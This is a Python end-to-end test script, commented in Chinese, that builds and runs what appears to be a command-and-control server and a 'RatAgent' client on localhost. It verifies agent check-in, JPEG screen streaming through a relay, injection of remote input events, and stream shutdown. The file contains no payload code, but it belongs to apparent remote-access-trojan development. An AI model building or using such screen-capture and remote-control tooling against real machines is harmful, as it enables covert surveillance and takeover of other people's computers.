# e2e_m4.py — 屏幕流端到端验收（协议 §9，长连接模式）
# 验证：Agent 上线 → ctl_stream_probe 发起屏幕流 → 帧经 4445 中继到达（JPEG）
#       → 输入事件下行 → 停止
import subprocess, sys, time, os

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
GO = r"C:/Users/202603/.g/go/bin/go.exe"
C2 = os.path.join(ROOT, "bin", "c2server.exe")
PROBE = os.path.join(ROOT, "bin", "ctl_stream_probe.exe")
AGENT = os.path.join(ROOT, "client", "x64", "Debug", "RatAgent.exe")
AGENT_DIR = os.path.join(ROOT, "client", "x64", "Debug")

ok = True
def check(name, cond, detail=""):
    global ok
    print(f"[{'PASS' if cond else 'FAIL'}] {name} {detail}")
    if not cond: ok = False

def main():
    os.makedirs(os.path.join(ROOT, "bin"), exist_ok=True)
    subprocess.run([GO, "build", "-o", C2, "./server/cmd/c2server"], check=True, capture_output=True, cwd=ROOT)
    subprocess.run([GO, "build", "-o", PROBE, "./scripts/ctl_stream_probe"], check=True, capture_output=True, cwd=ROOT)

    srv = subprocess.Popen([C2], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    agent = None
    try:
        time.sleep(1)
        # 长连接模式 agent（默认入口连 4444）
        agent = subprocess.Popen([AGENT, "127.0.0.1", "4444"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                 cwd=AGENT_DIR)
        time.sleep(3)
        aid = open(os.path.join(AGENT_DIR, "agent.id"), "rb").read(16).hex()
        check("agent 上线（agent.id 存在）", len(aid) == 32, aid)

        r = subprocess.run([PROBE, aid, "3", "15"], capture_output=True, text=True, timeout=35)
        print(r.stdout)
        check("屏幕流帧到达（JPEG 头校验）",
              r.returncode == 0 and "JPEG header OK" in r.stdout and "RESULT: PASS" in r.stdout)
        check("输入事件下行已发送", "input event sent" in r.stdout)
        check("停止后正常退出", "stream stop requested" in r.stdout)
        agent.terminate(); agent.wait(timeout=5)
    finally:
        if agent:
            try: agent.terminate(); agent.wait(timeout=3)
            except Exception: pass
        srv.terminate()
        try: srv.wait(timeout=3)
        except subprocess.TimeoutExpired: srv.kill()

    print("== RESULT:", "ALL PASS" if ok else "FAILURES PRESENT")
    sys.exit(0 if ok else 1)

if __name__ == "__main__":
    main()
